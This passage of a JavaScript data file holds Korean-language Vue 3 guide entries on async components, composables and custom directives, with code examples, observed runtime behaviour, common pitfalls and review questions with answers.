        code: "렌더됨 → [대기 (delay)] → 로딩 (loadingComponent) → 도착 (안쪽 컴포넌트 · props/slots 통과)\n                                   ↘ 실패 (로더 거부 · timeout ㄹ) → onError(retry → 로딩 / fail → errorComponent) (ㅁ ㄱ)\nSuspense 안: 상태 기계를 Suspense 가 가져감 (ㅂ) · Router: 자기 것 (ㅅ) · 래퍼는 모듈 최상위에 한 번 (ㅇ)\nSSR 3.5+: 도착 → [hydrate 조건] → 살아남 (idle · visible · media · interaction[재생] ㅋ)\n\n상태마다 그릴 것 · timeout + attempts · 분할 단위는 라우트·큰 것",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "컴포넌트 심화가 끝났습니다. 다음 장 '재사용성'은 컴포넌트 경계를 넘어 로직 자체를 꺼내는 셋, 컴포저블·커스텀 디렉티브·플러그인입니다. 실제로 돌려 보면 디렉티브 훅은 created → beforeMount → mounted → beforeUpdate → updated → beforeUnmount → unmounted 순이었고, 다중 루트 컴포넌트에 디렉티브를 걸면 경고였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 상품 상세의 리뷰 섹션(무거운 에디터 포함)을 처음 로드에서 빼려 합니다. 어떻게 쓰고 무엇을 정할까요? (2) SSR 페이지에서 그 리뷰 섹션은 스크롤해 내려가야 보입니다. 3.5에서 더 줄일 수 있는 것은? (3) 리뷰 섹션 로드가 실패했을 때 페이지 전체가 깨지지 않게 하려면?",
        notes: [
          {
            title: "답",
            body: "(1) 모듈 최상위에 const Reviews = defineAsyncComponent({ loader: () => import('./Reviews.vue'), loadingComponent: ReviewsSkeleton, delay: 200, errorComponent: ReviewsError, timeout: 10000 }). 번들러가 Reviews와 에디터를 별도 청크로 뗍니다. delay 200으로 빠른 로드엔 스켈레톤이 안 보이고(실제로 delay 0이면 즉시 보임), timeout으로 멈춘 네트워크를 에러로 돌립니다. props(:productId)와 슬롯은 그대로 통과합니다. (2) hydrate: hydrateOnVisible({ rootMargin: '200px' })를 더합니다. 서버 HTML은 그대로 보이되 그 컴포넌트의 JS 실행(하이드레이션)은 뷰포트에 가까워질 때까지 미뤄져 첫 로드의 JS 작업이 줄어듭니다. 사용자가 그 전에 건드리는 경우가 걱정이면 hydrateOnInteraction과 조합할 수 있고, 그 이벤트는 하이드레이션 뒤 재생됩니다. (3) 비동기 컴포넌트의 로더 실패는 그 자리의 errorComponent로만 가고 앱은 살아 있습니다(실제로 Fail은 에러 박스, 옆의 Lazy는 정상). onError(error, retry, fail, attempts)에서 네트워크 에러면 attempts < 3일 때 retry(), 아니면 fail()로 '새로 고침' 안내를 보입니다. 배포 후 청크 이름이 바뀐 경우가 흔한 원인이니 라우터 수준의 reload 처방도 함께 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Async Components", href: `${DOCS}/guide/components/async` },
      { label: "defineAsyncComponent()", href: `${DOCS}/api/general#defineasynccomponent` },
      { label: "Suspense", href: `${DOCS}/guide/built-ins/suspense` },
    ],
  },

  {
    id: "vg-reusability",
    name: "재사용성",
    tagline: "컴포넌트 경계를 넘어 로직을 꺼내는 셋: 컴포저블, 커스텀 디렉티브, 플러그인",
    intro:
      "가이드의 넷째 장, 세 페이지입니다. 컴포저블(Composition API로 상태 있는 로직을 함수로 꺼내 재사용. useMouse, useFetch), 커스텀 디렉티브(요소에 직접 DOM 조작을 붙이는 훅 묶음. v-focus), 플러그인(앱 수준 기능 설치. app.use). 셋은 재사용의 '단위'가 다릅니다. 컴포저블은 setup 안의 로직, 디렉티브는 요소 하나의 DOM 동작, 플러그인은 앱 전체의 자산·설정. 실제로 돌려 보면 디렉티브 훅 순서는 created → beforeMount → mounted → beforeUpdate → updated → beforeUnmount → unmounted였고, 다중 루트 컴포넌트에 디렉티브를 걸면 'Runtime directive used on component with non-element root node…' 경고였으며, 부모의 directives 옵션은 자식 템플릿에 보이지 않았고, customRef로 만든 디바운스 컴포저블은 연속 입력에 한 번만 반응했습니다.",
    blocks: [
      {
        label: "세 페이지 한눈에",
        body: "셋을 '무엇을 재사용하나'로 가릅니다.",
        code: "페이지            재사용 단위              모양                                     실제로 돌려 본 것\n1 컴포저블         setup 안 상태 있는 로직     use* 함수 · ref 묶음 반환 · toValue 로 입력      customRef 디바운스 'a','ab' → 한 번 · effectScope stop 뒤 무시 · 구조 분해 함정\n2 커스텀 디렉티브   요소 하나의 DOM 동작       { created … unmounted } · 함수 꼴 · vXxx       훅 7개 순서 · binding{arg, modifiers, value, oldValue} · 다중 루트 경고 · 로컬은 그 템플릿만\n3 플러그인         앱 전체 자산·설정          { install(app, options) } · app.use         (문서) 같은 플러그인은 한 번만 설치 · globalProperties 는 드물게",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 재사용의 단위를 틀리면 도구가 안 맞는다",
        body: "로직(상태·계산·부수 효과)을 재사용하려면 컴포저블입니다. 믹스인은 출처가 숨고 이름이 충돌해 문서가 더 이상 권하지 않습니다. 렌더리스 컴포넌트는 인스턴스 비용이 있어 DOM이 없는 로직엔 컴포저블이 낫습니다. 요소 하나의 저수준 DOM 조작(포커스, 외부 라이브러리 바인딩)은 디렉티브이고, 그것을 컴포넌트에 걸면 루트가 하나여야 합니다. 앱 전체에 컴포넌트·디렉티브·provide·globalProperties를 깔아야 하면 플러그인입니다. 자식 셋이 각각입니다.",
        code: "재사용할 것                      도구                 피할 것\n상태 있는 로직 (여러 컴포넌트)      컴포저블              믹스인 (출처 숨음 · 충돌) · 렌더리스 (인스턴스 비용)\n요소 하나의 DOM 동작              커스텀 디렉티브         다중 루트 컴포넌트에 걸기 (경고)\n앱 전체 설치                     플러그인              globalProperties 남발",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '컴포저블'부터입니다.",
      },
    ],
    sources: [
      { label: "Composables", href: `${DOCS}/guide/reusability/composables` },
      { label: "Plugins", href: `${DOCS}/guide/reusability/plugins` },
    ],
  },

  {
    id: "vg-reuse-composables",
    name: "컴포저블",
    tagline: "상태 있는 로직을 use* 함수로 — 입력은 toValue 로 받고, 출력은 ref 묶음으로 돌려준다",
    intro:
      "재사용성 첫 페이지입니다. 컴포저블은 'Composition API를 활용해 상태 있는 로직을 캡슐화하고 재사용하는 함수'입니다. 상태 없는 유틸(lodash, date-fns)과 다릅니다. 문서의 예 useMouse는 ref x, y를 만들고 onMounted에서 리스너를 걸고 onUnmounted에서 떼어 { x, y }를 돌려줍니다. useFetch는 url을 ref나 getter로 받아 watchEffect 안에서 toValue(url)로 읽습니다. 관례: 이름은 use로 시작, 입력은 toValue()로 ref·getter·값을 모두 받기, 출력은 ref들을 담은 plain 객체(구조 분해해도 반응 유지), 부수 효과는 onMounted(SSR)·정리는 onUnmounted, 호출은 <script setup>이나 setup() 안에서 동기로(await 뒤 예외는 <script setup>만). 믹스인(출처 불명·충돌·결합)과 렌더리스 컴포넌트(인스턴스 비용)보다 권장. React 훅과 비슷하되 setup은 한 번만 돌아 의존성 배열·stale closure·메모이제이션이 없습니다. 실제로 돌려 보면 customRef 디바운스는 연속 쓰기에 한 번만 반응했고, effectScope는 stop 뒤 변경을 무시하며 onScopeDispose를 불렀고, reactive를 구조 분해한 값은 끊겼습니다. 이 노드의 질문은 하나입니다. 로직을 함수로 꺼낼 때 무엇을 지키나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "useMouse: export function useMouse() { const x = ref(0); const y = ref(0); function update(e) { x.value = e.pageX; y.value = e.pageY } onMounted(() => window.addEventListener('mousemove', update)); onUnmounted(() => window.removeEventListener('mousemove', update)); return { x, y } }. 컴포넌트는 const { x, y } = useMouse(). 컴포저블은 다른 컴포저블을 부를 수 있어(useEventListener) 작은 단위로 조합합니다. 각 컴포넌트 인스턴스가 자기 상태를 가집니다. 비동기: useFetch(url)가 url을 ref·getter·문자열 중 무엇으로 받아도 되게 watchEffect(() => fetchData()) 안에서 fetch(toValue(url))(3.3+ toValue). 관례 넷: 이름 use*. 입력은 toValue()로 정규화(ref·getter·값). 반환은 '여러 ref를 담은 plain 객체'(reactive 객체가 아니라. 구조 분해 유지. 객체로 쓰고 싶으면 호출 쪽에서 reactive(useMouse())). 부수 효과: DOM 접근은 onMounted(SSR 안전), 정리는 onUnmounted. 제약: '컴포저블은 <script setup>이나 setup() 안에서 동기로 불러야 한다'(라이프사이클·provide 컨텍스트 때문. <script setup>은 await 뒤도 됨). vs 믹스인: '출처 불명, 네임스페이스 충돌, 암묵적 결합' 때문에 '더 이상 권장하지 않음'. vs 렌더리스 컴포넌트: 로직만이면 컴포저블(인스턴스 비용 없음), 로직 + 레이아웃이면 컴포넌트. vs React 훅: 비슷한 아이디어, 세밀한 반응성이라 실행 모델이 다름.",
        code: "// composables/useFetch.js\nimport { ref, watchEffect, toValue } from 'vue'\nexport function useFetch(url) {                          // url: string | Ref<string> | () => string\n  const data = ref(null); const error = ref(null)\n  const fetchData = () => { data.value = null; error.value = null\n    fetch(toValue(url)).then(r => r.json()).then(j => data.value = j).catch(e => error.value = e) }\n  watchEffect(() => fetchData())                          // toValue(url) 가 ref/getter 면 추적\n  return { data, error }                                  // ref 묶음 — 구조 분해 OK\n}\n\n// 사용\nconst { data, error } = useFetch(() => `/api/posts/${props.id}`)   // getter → id 바뀌면 다시\nconst state = reactive(useMouse())                                   // 객체로 쓰고 싶으면 호출 쪽에서\n\n// 정리 — 컴포저블 안에서\nonUnmounted(() => window.removeEventListener('mousemove', update))\n// 또는 effectScope 밖에서 쓰면 onScopeDispose",
        terms: [
          {
            term: "toValue (3.3+)",
            body: "ref면 .value, getter 함수면 호출 결과, 그 밖은 그대로 돌려주는 정규화 함수입니다. 컴포저블의 입력을 '값·ref·getter' 셋 다 받게 하는 관례의 핵심이고, watchEffect나 getter 안에서 부르면 ref·getter 안의 의존이 추적됩니다. 3.5의 반응형 props 구조 분해에서 구조 분해한 prop을 컴포저블에 넘길 때 () => prop처럼 getter로 넘기면 toValue가 받습니다. unref는 ref만 풀고 getter는 안 부릅니다.",
          },
          {
            term: "effectScope · onScopeDispose",
            body: "컴포넌트 밖에서 컴포저블을 쓸 때 효과(watch·computed)의 수명을 묶는 장치입니다. const scope = effectScope(); scope.run(() => { … }); scope.stop(). 컴포넌트 setup 안에서 만든 효과는 컴포넌트가 그 역할을 자동으로 하지만, 스토어나 테스트처럼 컴포넌트가 없는 자리에서는 scope가 필요합니다. 컴포저블 안의 정리는 onUnmounted 대신 onScopeDispose를 쓰면 둘 다에서 동작합니다(3.5+ 둘째 인자 true로 scope 없을 때 경고 억제). 실제로 돌려 보면 stop 뒤 변경이 무시되고 onScopeDispose가 불렸습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 customRef로 디바운스 ref 컴포저블 useDebounced(v, ms)를 만들고 watch를 건 뒤 'a', 'ab'를 연달아 쓰니 20ms 뒤 watch가 'ab' 한 번만 불렸습니다. customRef의 track/trigger로 반응 시점을 직접 정한 것입니다. effectScope().run 안에서 watchEffect와 onScopeDispose를 등록하고 scope.stop()하니 이후 변경에 효과가 돌지 않았고 disposed가 true였습니다. reactive 객체를 구조 분해한 원시값은 바뀌지 않고 효과도 안 돌았으며(반응성 기초), toRefs로 풀면 양방향 동기(a.value = 10 → st.a 10)였습니다. watchEffect(async)는 첫 await 전까지만 추적했으므로 컴포저블의 비동기 로직은 toValue(url)를 await 전에 읽어야 합니다. toRef(() => 1)·toValue(() => 4)는 getter를 풀었습니다. 3.5 compileScript에서 구조 분해한 prop을 watch에 값으로 넘기면 컴파일 에러, getter면 통과였습니다. 서버 렌더에서는 onMounted가 돌지 않아(SSR 측정) DOM 접근을 onMounted에 두는 관례가 SSR 안전의 이유입니다.",
        code: "// Node 24 · vue 3.5.45\nconst d = useDebounced('', 20); watch(d, log)\nd.value = 'a'; d.value = 'ab'   → 40ms 뒤 log: ['ab']   (customRef track/trigger)\n\nconst scope = effectScope(); scope.run(() => { watchEffect(…); onScopeDispose(() => disposed = true) })\nscope.stop() → 이후 변경 무시 · disposed true\n\nlet { n } = reactive({ n: 0 }); n++ → 추적 없음        const { a } = toRefs(state); a.value = 10 → state.a 10\ntoValue(() => 4) → 4 · toRef(() => 1).value → 1\nwatchEffect(async () => { url.value; await …; filter.value }) → filter 미추적 (await 뒤)\nwatch(destructuredProp) → compile error · watch(() => destructuredProp) ✓",
      },
      {
        label: "문제: 컴포저블이 돌려준 값이 안 바뀐다",
        body: "export function useCounter() { const state = reactive({ count: 0, inc: () => state.count++ }); return state }를 const { count, inc } = useCounter()로 받았습니다. inc를 눌러도 count가 0입니다. reactive 객체를 구조 분해하면 원시 프로퍼티의 연결이 끊깁니다(실제로 확인). 문서의 관례 '여러 ref를 담은 plain 객체를 돌려줄 것'이 이 사고를 막습니다. return { count, inc }에서 count가 ref면 구조 분해해도 .value로 연결이 살고 템플릿에서는 풀립니다. 이미 reactive를 돌려주는 컴포저블이면 호출 쪽에서 toRefs(useCounter())로 풀거나 구조 분해하지 않고 state.count로 읽습니다. 반대로 ref 묶음을 객체처럼 쓰고 싶으면 호출 쪽에서 reactive(useCounter())로 감싸면 안에서 풀립니다.",
      },
      {
        label: "문제가 나는 경우: 관례를 어길 때",
        body: "경우 ㄱ, reactive 반환 + 구조 분해입니다. 위의 사고입니다. 경우 ㄴ, setup 밖(핸들러·setTimeout)에서 컴포저블 호출. onMounted·inject 컨텍스트 없음, 경고. setup에서 호출해 함수를 보관. 경우 ㄷ, 입력을 값으로만 받음(useFetch(url.value)). 바뀌어도 모름. toValue + getter/ref 받기. 경우 ㄹ, 비동기 watchEffect에서 await 뒤에 입력 읽기. 미추적(실제로). await 전에. 경우 ㅁ, 정리 없음(리스너·타이머). 누수. onUnmounted 또는 onScopeDispose. 경우 ㅂ, 컴포넌트 밖(스토어 모듈)에서 watch를 만들고 안 멈춤. 영구. effectScope. 경우 ㅅ, DOM 접근을 함수 몸에 바로. SSR에서 window 없음. onMounted. 경우 ㅇ, 믹스인으로 재사용. 출처·충돌. 컴포저블. 경우 ㅈ, 로직만인데 렌더리스 컴포넌트. 인스턴스 비용. 컴포저블. 경우 ㅊ, 모듈 전역 ref를 컴포저블이 공유(의도치 않게). 모든 인스턴스가 한 상태, SSR 오염. 함수 안에서 생성. 경우 ㅋ, 이름에 use 없음. 관례 위반, 린트 못 잡음. 경우 ㅌ, 3.5 구조 분해 prop을 값으로 넘김. 끊김(watch는 컴파일 에러). getter. 경우 ㅍ, React 식 의존성 배열·useCallback 흉내. 불필요. setup은 한 번.",
        code: "경우               언제 생기나                        겉모습                              처방\nㄱ reactive 구조 분해  const { count } = useX()            안 바뀜 (실제로)                      ref 묶음 반환 · toRefs\nㄴ setup 밖 호출     onClick 안 useX()                   컨텍스트 없음 · 경고                   setup 에서\nㄷ 값 입력          useFetch(url.value)                 변경 모름                            toValue(ref|getter)\nㄹ await 뒤 읽기     watchEffect(async)                  미추적 (실제로)                       await 전\nㅁ 정리 없음        addEventListener 만                  누수                                onUnmounted · onScopeDispose\nㅂ 밖에서 watch      스토어 모듈 watch                    영구                                effectScope\nㅅ 즉시 DOM         함수 몸에 window                     SSR 에러                             onMounted\nㅇ 믹스인          mixins: [x]                         출처 불명 · 충돌                       컴포저블\nㅈ 렌더리스        <MouseTracker v-slot>                인스턴스 비용                         컴포저블\nㅊ 모듈 전역 공유    export const state = ref()            모든 인스턴스 공유 · SSR 오염           함수 안 생성\nㅋ use 접두 없음    getMouse()                          관례 위반                            useMouse\nㅌ 구조 분해 prop    useX(count)                         끊김                                useX(() => count)\nㅍ React 흉내       deps 배열 · 메모                     불필요                               -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 컴포저블은 'setup 의 일부' 를 함수로 뗀 것이라 setup 의 규칙(컨텍스트·반응성·수명)을 그대로 지닌다",
        body: "컴포저블 안의 코드는 호출한 컴포넌트의 setup 안에서 실행되는 것과 같습니다. 그래서 라이프사이클·inject는 setup 컨텍스트가 있어야 하고(ㄴ), 반응성은 '읽는 길'을 지켜야 하며(ㄱ, ㄷ, ㄹ, ㅌ), 시작한 효과는 컴포넌트와 함께 끝나야 합니다(ㅁ, ㅂ). 컴포넌트가 없는 자리(스토어, 테스트)에서는 effectScope가 컴포넌트의 수명 역할을 대신합니다. 관례 넷(use 접두, toValue 입력, ref 묶음 출력, onMounted/onUnmounted)은 그 규칙을 함수 경계에서 지키는 장치입니다. 믹스인·렌더리스가 밀린 이유도 같습니다. 출처·수명·비용이 함수 하나로 명시되지 않기 때문입니다(ㅇ, ㅈ). 처방은 컴포저블을 쓸 때 '이 함수가 setup 안에서 인라인으로 있었다면 괜찮은가'를 묻는 것입니다.",
        code: "컴포넌트 setup { … useX() … }   ≡   setup 안에 useX 몸체가 인라인된 것\n  컨텍스트: 라이프사이클 · inject → setup 중 동기 (ㄴ)\n  반응성:   입력 toValue(ref|getter) (ㄷ ㅌ) · 출력 ref 묶음 (ㄱ) · await 전 읽기 (ㄹ)\n  수명:     onMounted(DOM ㅅ) · onUnmounted/onScopeDispose (ㅁ) · 컴포넌트 없으면 effectScope (ㅂ)\n\n묻기: 이 함수 몸이 setup 안에 그대로 있었다면 괜찮은가?",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "로직이 아니라 요소 하나의 DOM 동작을 재사용하는 것이 다음 페이지 '커스텀 디렉티브'입니다. 실제로 돌려 보면 훅 일곱의 순서와 binding의 arg·modifiers·value·oldValue, 다중 루트 경고를 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 여러 컴포넌트에서 쓰는 '무한 스크롤' 로직(IntersectionObserver로 바닥 감지 → 콜백)을 컴포저블로 만들려 합니다. 시그니처와 안에서 지킬 것은? (2) 그 컴포저블을 Pinia 스토어 안에서도 쓰려는데 onUnmounted 경고가 납니다. 왜고 어떻게? (3) 호출 쪽에서 const { isNearBottom } = useInfiniteScroll(el)로 받았는데 안 바뀝니다. 체크할 것은?",
        notes: [
          {
            title: "답",
            body: "(1) export function useInfiniteScroll(target, onReach, options = {}). target은 템플릿 ref(ref<Element|null>)나 getter로 받아 toValue(target)으로 읽습니다. observer 생성은 onMounted(또는 watch(target)로 요소가 생길 때)에서 하고(SSR 안전), 해제는 onUnmounted/onScopeDispose에서 disconnect. 반환은 { isNearBottom: ref, stop }처럼 ref 묶음. 비동기 콜백이면 입력은 await 전에 읽습니다. (2) onUnmounted는 컴포넌트 setup 컨텍스트가 있어야 합니다. 스토어는 컴포넌트가 아니라 경고입니다. 정리를 onScopeDispose(fn)로 바꾸면 컴포넌트에서는 컴포넌트 수명에, 스토어에서는 스토어의 effectScope(Pinia가 제공)에 묶입니다. 3.5+면 onScopeDispose(fn, true)로 scope가 없을 때 경고를 끌 수 있습니다. 실제로 돌려 보면 scope.stop()이 onScopeDispose를 불렀습니다. (3) 컴포저블이 reactive 객체를 돌려주는지 봅니다. reactive를 구조 분해하면 끊깁니다(실제로 확인). ref를 담은 plain 객체를 돌려주도록 고치거나 toRefs로 받습니다. 그리고 target이 마운트 전 null인 템플릿 ref인데 함수 몸에서 바로 observe했는지, observer를 onMounted/watch에서 만들었는지 확인합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Composables", href: `${DOCS}/guide/reusability/composables` },
      { label: "toValue()", href: `${DOCS}/api/reactivity-utilities#tovalue` },
      { label: "effectScope()", href: `${DOCS}/api/reactivity-advanced#effectscope` },
    ],
  },

  {
    id: "vg-reuse-directives",
    name: "커스텀 디렉티브",
    tagline: "요소 하나에 DOM 조작을 붙이는 훅 일곱 — 컴포넌트에는 루트가 하나일 때만",
    intro:
      "재사용성 둘째 페이지입니다. 커스텀 디렉티브는 '요소에 대한 저수준 DOM 접근이 필요한 로직'을 재사용하는 길입니다. v-focus처럼. 디렉티브는 훅을 담은 객체: created, beforeMount, mounted, beforeUpdate, updated, beforeUnmount, unmounted. 훅 인자는 (el, binding, vnode, prevVnode)이고 binding에는 value, oldValue(beforeUpdate·updated만), arg, modifiers, instance, dir. 함수 하나만 넘기면 mounted와 updated에서 불립니다. 등록은 <script setup>에서 vXxx 변수(v-xxx로 사용), directives 옵션, app.directive. 경고: '컴포넌트에 커스텀 디렉티브를 쓰는 것은 권장하지 않음. 루트가 여럿이면 예기치 않은 동작'. 루트가 여럿이면 무시되고 경고, $attrs로 전달도 안 됨. 실제로 돌려 보면 훅 순서는 created → beforeMount → mounted(arg=foo, modifiers {bar:true}, value=0, prevVnode=null) → beforeUpdate → updated(old=0, new=1, prevVnode 있음) → beforeUnmount → unmounted였고, 다중 루트 컴포넌트에 걸면 'Runtime directive used on component with non-element root node. The directives will not function as intended.'였으며, 부모의 directives 옵션은 자식 템플릿에서 'Failed to resolve directive'였습니다. 이 노드의 질문은 하나입니다. 디렉티브는 무엇을 언제 받나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<script setup>: const vFocus = { mounted: (el) => el.focus() } 뒤 <input v-focus />('v 접두 camelCase 변수는 디렉티브로 사용 가능'). 보통 <script>: directives: { focus: { mounted(el) { el.focus() } } }. 전역: app.directive('focus', { … }). 훅: created(속성·리스너 적용 전), beforeMount(DOM 삽입 전), mounted(부모 삽입 후. 자식 모두 마운트), beforeUpdate(부모 갱신 전), updated(부모와 자식 갱신 후), beforeUnmount, unmounted. 인자: el(요소), binding { value(식 값), oldValue(beforeUpdate·updated만), arg(v-x:foo의 foo. 동적 :[arg]도), modifiers(v-x.bar → { bar: true }), instance(사용한 컴포넌트), dir(정의 객체) }, vnode, prevVnode(beforeUpdate·updated만). 'el 외의 인자는 읽기 전용으로 다룰 것. 훅 사이 공유는 el.dataset'. 함수 꼴: app.directive('color', (el, binding) => { el.style.color = binding.value })는 mounted + updated. 값은 객체 리터럴도: v-demo=\"{ color: 'white', text: 'hello!' }\". 컴포넌트에: 폴스루처럼 루트 요소에 적용되되 '권장하지 않음. 다중 루트면 무시 + 경고, $attrs로 전달 불가'. 쓸 자리: '직접 DOM 조작으로만 가능한 기능'. v-bind 같은 내장으로 되면 그것을. SSR: getSSRProps로 서버 렌더에 속성 추가(SSR 노드).",
        code: "<script setup>\n// v 접두 변수 → v-highlight\nconst vHighlight = {\n  created(el, binding, vnode) {},                                   // 속성 적용 전\n  mounted(el, binding) { el.classList.add(binding.arg ?? 'is-highlight'); el.dataset.n = binding.value },\n  updated(el, binding) { if (binding.value !== binding.oldValue) el.dataset.n = binding.value },\n  unmounted(el) { el.classList.remove('is-highlight') },\n}\n// 함수 꼴 = mounted + updated\nconst vColor = (el, binding) => { el.style.color = binding.value }\n</script>\n<template>\n  <p v-highlight:warn.strong=\"count\">…</p>      <!-- arg 'warn' · modifiers { strong: true } · value count -->\n  <p v-color=\"'red'\">…</p>\n  <p v-demo=\"{ color: 'white', text: 'hello!' }\">…</p>\n</template>\n\n// 전역\napp.directive('focus', { mounted: (el) => el.focus() })\n\n<!-- 컴포넌트에: 루트 하나일 때만 · 비권장 -->\n<MyComp v-highlight />   <!-- 루트 둘이면 무시 + 경고 -->",
        terms: [
          {
            term: "binding 객체",
            body: "디렉티브 훅의 둘째 인자로, 템플릿에 적은 것을 풀어 놓은 객체입니다. v-x:arg.mod1.mod2=\"expr\"이면 arg: 'arg', modifiers: { mod1: true, mod2: true }, value: expr의 값, oldValue: 이전 값(갱신 훅만), instance: 쓴 컴포넌트의 공개 인스턴스, dir: 디렉티브 정의. 실제로 돌려 보면 mounted에서 arg=foo mods={\"bar\":true} value=0, updated에서 old=0 new=1이었습니다. 읽기 전용으로 다루고 훅 사이에 상태를 넘기려면 el.dataset이나 WeakMap을 씁니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 app.directive('dir', { 7개 훅 })을 전역 등록하고 <i v-dir:foo.bar=\"n\">에 걸었습니다. 마운트: created → beforeMount → mounted(el=I, arg=foo, mods={\"bar\":true}, value=0, prevVnode=null). n을 1로 바꾸니 beforeUpdate → updated(old=0, new=1, prevVnode 있음). 언마운트: beforeUnmount → unmounted. 함수 꼴 디렉티브는 mounted와 updated에서 불렸습니다. 루트가 <p>a</p><p>b</p> 둘인 컴포넌트에 v-dir을 걸니 '[Vue warn]: Runtime directive used on component with non-element root node. The directives will not function as intended.'이고 mounted가 불리지 않았습니다. 부모의 directives 옵션에 local을 등록하고 자식 템플릿에서 v-local을 쓰니 'Failed to resolve directive: local'. 디렉티브 등록도 컴포넌트·템플릿 범위입니다. 컴파일 출력에서 디렉티브는 _withDirectives(vnode, [[_directive_dir, value, arg, modifiers]])로 감싸였고, v-model도 같은 꼴(_vModelText)로 나와 내장 v-model이 런타임 디렉티브임을 보여 줍니다. 서버 렌더에서는 DOM 훅이 돌지 않습니다(getSSRProps만).",
        code: "// Chrome 156 · vue 3.5.45\n<i v-dir:foo.bar=\"n\">  (app.directive 전역)\n마운트:   created → beforeMount → mounted el=I arg=foo mods={\"bar\":true} value=0 prevVnode=null\n갱신 n=1: beforeUpdate → updated old=0 new=1 prevVnode=true\n언마운트:  beforeUnmount → unmounted\n함수 꼴 (el, binding) => …  → mounted · updated 에서\n\n<Multi v-dir /> (루트 둘) → warn: Runtime directive used on component with non-element root node. The directives will not function as intended.  (mounted 안 불림)\n부모 { directives: { local } } · 자식 <b v-local>  → warn: Failed to resolve directive: local\n\n// 컴파일 출력\n_withDirectives(_createElementVNode(\"input\", …), [[_vModelText, _ctx.v, void 0, { trim: true, number: true }]])   ← v-model 도 런타임 디렉티브",
      },
      {
        label: "문제: 툴팁 디렉티브를 컴포넌트에 걸었는데 동작하지 않는다",
        body: "<UserBadge v-tooltip=\"'관리자'\" />. UserBadge의 템플릿이 <img/><span/> 둘입니다. 콘솔에 'Runtime directive used on component with non-element root node. The directives will not function as intended.'가 있고 툴팁은 안 뜹니다(실제로 mounted가 불리지 않음). 디렉티브는 폴스루처럼 컴포넌트의 '루트 요소'에 적용되는데 루트가 여럿이면 자리가 없습니다. 문서는 아예 '컴포넌트에 커스텀 디렉티브를 쓰지 말라'고 권합니다. 처방은 UserBadge 안의 특정 요소에 디렉티브를 걸게 하는 것입니다. 디렉티브 대신 tooltip prop을 받아 안에서 <span v-tooltip=\"tooltip\">로 쓰거나, 컴포넌트를 <span v-tooltip> 요소로 감쌉니다. 디렉티브는 '이 요소에'라는 뜻이고 컴포넌트는 요소가 아닙니다.",
      },
      {
        label: "문제가 나는 경우: 요소와 시점을 모를 때",
        body: "경우 ㄱ, 다중 루트 컴포넌트에 디렉티브입니다. 위의 사고입니다. 경우 ㄴ, 단일 루트 컴포넌트에 걸고 동작하는데 리팩터링으로 루트가 둘이 되어 조용히(경고만) 깨짐. 요소에 걸기. 경우 ㄷ, created에서 DOM 측정. 아직 삽입 전. mounted. 경우 ㄹ, mounted에서 oldValue 사용. undefined(갱신 훅만). 경우 ㅁ, 함수 꼴로 정리(unmounted)를 기대. mounted·updated만. 객체 꼴. 경우 ㅂ, 훅 사이 상태를 binding에 저장. 읽기 전용. el.dataset·WeakMap. 경우 ㅅ, 부모의 로컬 디렉티브를 자식에서. Failed to resolve(실제로). 자식에서 등록 또는 전역. 경우 ㅇ, <script setup> 변수 이름이 v 접두가 아님(highlight). 디렉티브로 인식 안 됨. vHighlight. 경우 ㅈ, 디렉티브로 상태 변경·네트워크. DOM 외의 일은 컴포저블. 경우 ㅊ, v-bind로 되는 것을 디렉티브로(class 토글). 내장으로. 경우 ㅋ, SSR에서 mounted가 돌 거라 기대. 서버엔 없음. getSSRProps. 경우 ㅌ, updated에서 값 비교 없이 매번 비싼 작업. 갱신마다. value !== oldValue 검사. 경우 ㅍ, 서드파티 인스턴스를 el에 매단 뒤 unmounted에서 안 정리. 누수. unmounted에서 destroy.",
        code: "경우               언제 생기나                        겉모습                                                       처방\nㄱ 다중 루트 컴포넌트  <Comp v-x> 루트 둘                   Runtime directive used on component with non-element root node…   요소에 걸기 · prop\nㄴ 리팩터링 깨짐     루트가 둘로                          조용히 무시                                                 요소에\nㄷ created 측정     DOM 전                              없음                                                      mounted\nㄹ mounted oldValue  첫 훅                               undefined                                                 updated\nㅁ 함수 꼴 정리      (el, b) => …                       unmounted 없음                                             객체 꼴\nㅂ binding 에 저장    binding.state = x                  읽기 전용                                                  el.dataset · WeakMap\nㅅ 로컬 범위        부모 directives → 자식                Failed to resolve directive (실제로)                          자식 등록 · app.directive\nㅇ 이름 규칙        const highlight = …                 미인식                                                     vHighlight\nㅈ DOM 외 일        디렉티브로 fetch                     설계 어긋남                                                 컴포저블\nㅊ 내장으로 됨       v-toggle-class                      중복                                                      :class\nㅋ SSR mounted      서버                                안 돎                                                     getSSRProps\nㅌ 매번 작업        updated 무조건                       비용                                                      값 비교\nㅍ 정리 누락        서드파티 init 만                     누수                                                      unmounted destroy",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 디렉티브는 '요소의 생명주기에 매단 DOM 조작' 이라 요소가 하나여야 하고, DOM 이 있는 시점부터다",
